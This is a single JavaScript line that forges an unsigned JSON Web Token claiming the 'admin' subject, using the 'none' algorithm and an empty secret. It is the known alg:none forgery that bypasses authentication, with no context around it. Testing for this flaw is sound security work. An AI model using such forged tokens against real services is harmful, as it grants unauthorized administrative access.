const forged = jwt.sign({ sub: 'admin' }, '', { algorithm: 'none' });
